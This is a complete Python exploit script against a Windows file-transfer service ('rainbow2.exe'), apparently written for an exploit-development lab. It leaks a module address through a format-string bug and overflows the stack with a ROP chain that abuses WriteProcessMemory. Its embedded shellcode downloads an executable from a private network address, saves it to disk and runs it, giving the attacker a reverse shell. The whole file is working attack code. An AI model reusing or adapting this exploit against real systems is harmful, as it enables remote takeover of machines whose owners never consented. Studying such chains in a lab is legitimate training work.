import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 2121
target = (TARGET_IP, TARGET_PORT) 

payload = b"PUT %p-%p-%p-%p"
leak = []
with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    print(f"sent {sent} bytes")

    resp = sock.recv(512) 
    print(resp)
    

    s = str(resp)
    leak = s.split("-")[1]
    filesrv = int(hex(int("0x"+leak,16) - 0x14120),16)
    #print(base)

    #EXPLOIT

    #\x00\x09\x0a\x0b\x0c\x0d\x20\x2F\x5C
    total = 2100  # change me
    crash = 1032

    rop_nop = struct.pack("<I", filesrv + 0x1010) # ret |  {PAGE_EXECUTE_READ} [rainbow2.exe]

    #step 1 - save esp in ebp e eax
    rop = struct.pack("<I", filesrv + 0x3dc54) # PUSH ESP # ADD ESI,EAX # AAS # POP EBP # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", filesrv + 0x35bd3)  # XCHG EAX,EBP # RETN
    
    #step 2 - jump over template
    rop += struct.pack("<I", filesrv + 0x8a9b3)  # ADD ESP,1C # RETN    ** [rainbow2.exe] ** 
    
    #0:003> u poi(3FC6015C) -->    #KERNEL32!WriteFile:
    rop += struct.pack('<L', filesrv + 0x9015c)    # Pointer to KERNEL32!WriteFile (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
    rop += struct.pack('<L', filesrv + 0x8fea3)    # RX from MODULE no aslr (Protect: 00000020)
    rop += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
    rop += struct.pack('<L', filesrv + 0x8fea3)    # lpBaseAddress = RX from MODULE no aslr (Protect: 00000020)
    rop += struct.pack('<L', 0x22222222)    # lpBuffer = base address of shellcode (dynamically generated)
    rop += struct.pack('<L', 0x11111111)    # nSize = size of shellcode  - 0x150
    rop += struct.pack('<L', filesrv + 0xa933c)    # lpNumberOfBytesWritten = RW in MODULE no aslr (Protect: 00000004) - DWORD  writable

    #step 3 - patching pointer to kerne32!writefile
    #0:003> u poi(3FC6015C)+13a40  -> WriteProcessMemoryStub
    rop += struct.pack('<L', filesrv + 0x76096) # ADD EAX,8 # RETN    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", filesrv + 0x35680)  # ADD EBX,EAX # RETN 0x00    ** [rainbow2.exe] **
    rop += struct.pack("<I", filesrv + 0x6219f ) # XOR EDX,EDX # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", filesrv + 0x316ae)  # ADD EDX,EBX # POP EBX # RETN 0x10    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", 0x7777794b) # padding for pop ebx
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += struct.pack('<L', filesrv + 0x457db) # MOV EAX,DWORD PTR [EAX] # POP EBP # RETN    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack('<L', filesrv + 0x457db) # MOV EAX,DWORD PTR [EAX] # POP EBP # RETN    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack('<L', filesrv + 0x68039)  # POP ECX # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", 0xfffec5c0) # -13a40
    rop += struct.pack('<L', filesrv + 0x599da) # SUB EAX,ECX # POP EBP # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", 0x88888888) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x4bfa0)  # MOV DWORD PTR [EDX],EAX # RETN    ** [rainbow2.exe] **

    #patching shellcode address
    rop += struct.pack('<L', filesrv + 0x3ac3c) # INC EBX # MOV EAX,EDX # RETN    ** [rainbow2.exe] ** 
    rop += struct.pack('<L', filesrv + 0x76096) # ADD EAX,8 # RETN    ** [rainbow2.exe] ** 
    rop += struct.pack('<L', filesrv + 0x7609f) # ADD EAX,4 # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", filesrv + 0x35bd3)  # XCHG EAX,EBP # RETN
    rop += struct.pack("<I", filesrv + 0x35680) # ADD EBX,EAX # RETN 0x00    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", filesrv + 0x316ae)  # ADD EDX,EBX # POP EBX # RETN 0x10    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", 0x777778bc) # padding for pop ebx
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += rop_nop
    rop += struct.pack("<I", filesrv + 0x35bd3)  # XCHG EAX,EBP # RETN
    rop += struct.pack('<L', filesrv + 0x19712)  # MOV DWORD PTR [EAX+4],EDX # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x88888888) # padding for pop ebp

    #patching nsize
    rop += struct.pack('<L', filesrv + 0x76096) # ADD EAX,8 # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", filesrv + 0x35bd3)  # XCHG EAX,EBP # RETN
    rop += struct.pack("<I", filesrv + 0x35680) # ADD EBX,EAX # RETN 0x00    ** [rainbow2.exe] ** 
    rop += struct.pack("<I", filesrv + 0x35bd3)  # XCHG EAX,EBP # RETN
    rop += struct.pack("<I", filesrv + 0x7e78b)  # MOV DWORD PTR [EAX],EBX # POP EDI # POP ESI # POP EBX # POP EBP # RETN    ** [rainbow2.exe] **
    rop += struct.pack("<I", 0x41414141) # padding for pop edi
    rop += struct.pack("<I", 0x41414141) # padding for pop esi
    rop += struct.pack("<I", 0x41414141) # padding for pop ebx
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp

    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp
    rop += struct.pack("<I", filesrv + 0x86560) # SUB EAX,2 # POP EBP # RETN    ** [rainbow2.exe] **  
    rop += struct.pack("<I", 0x41414141) # padding for pop ebp

    rop += struct.pack("<I", filesrv + 0x71cb8)  # XCHG EAX,ESP # RETN    ** [rainbow2.exe] ** 
    rop += b"\x90" * (500 - len(rop)-8)

    #custom shellcode - download&execute rev shell
    shellcode  = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9"
    shellcode += b"\x64\x8b\x71\x30\xb8\xf4\xff\xff\xff\xf7"
    shellcode += b"\xd8\x8b\x34\x06\x8b\x76\x1c\xb8\xe0\xff"
    shellcode += b"\xff\xff\xf7\xd8\x8b\x5e\x08\x8b\x3c\x06"
    shellcode += b"\x8b\x36\x66\x39\x4f\x18\x75\xeb\xeb\x06"
    shellcode += b"\x5e\x89\x75\x04\xeb\x66\xe8\xf5\xff\xff"
    shellcode += b"\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01"
    shellcode += b"\xdf\xbe\xe0\xff\xff\xff\xf7\xde\x8b\x4f"
    shellcode += b"\x18\x8b\x04\x37\x01\xd8\x89\x45\xfc\xe3"
    shellcode += b"\x41\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde"
    shellcode += b"\x31\xc0\x99\xfc\xac\x84\xc0\x74\x10\xc1"
    shellcode += b"\xca\x02\xc1\xca\x02\xc1\xca\x03\xc1\xca"
    shellcode += b"\x06\x01\xc2\xeb\xeb\x3b\x54\x24\x24\x75"
    shellcode += b"\xd6\x8b\x57\x24\x01\xda\x4a\x66\x8b\x4c"
    shellcode += b"\x4a\x01\x8b\x57\x1c\x01\xda\x8b\x04\x8a"
    shellcode += b"\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83"
    shellcode += b"\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68"
    shellcode += b"\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14"
    shellcode += b"\x68\x98\xfe\x8a\x0e\xff\x55\x04\x89\x45"
    shellcode += b"\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x6f"
    shellcode += b"\x6e\x2e\x64\x68\x75\x72\x6c\x6d\x54\xff"
    shellcode += b"\x55\x14\x89\xc3\x68\x36\x1a\x2f\x70\xff"
    shellcode += b"\x55\x04\x89\x45\x24\x51\x68\x2e\x65\x78"
    shellcode += b"\x65\x68\x35\x34\x2f\x6d\x68\x31\x34\x2e"
    shellcode += b"\x31\x68\x36\x38\x2e\x31\x68\x39\x32\x2e"
    shellcode += b"\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74"
    shellcode += b"\x70\x54\x5e\x51\x68\x2e\x65\x78\x65\x68"
    shellcode += b"\x6c\x73\x5c\x61\x68\x79\x6d\x62\x6f\x68"
    shellcode += b"\x43\x3a\x2f\x73\x54\x5f\x51\x51\x57\x56"
    shellcode += b"\x51\xff\x55\x24\x51\x57\xff\x55\x18\x31"
    shellcode += b"\xc9\x51\x6a\xff\xff\x55\x10"

    payload = b"PUT "
    payload += b"A" * crash
    payload += b"A" * 4
    payload += struct.pack("<I", filesrv + 0x11396) # ADD ESP,0E10 # RETN    ** [rainbow2.exe] **
    payload += b"B" * 92
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop_nop
    payload += rop
    payload += b"\x90"*4
    payload += shellcode
    print(total - len(payload))
    payload += b"D" * (total - len(payload))


    sent = sock.send(payload)
    print(f"sent {sent} bytes")

    resp = sock.recv(512) 
    print(resp)

    sock.close()
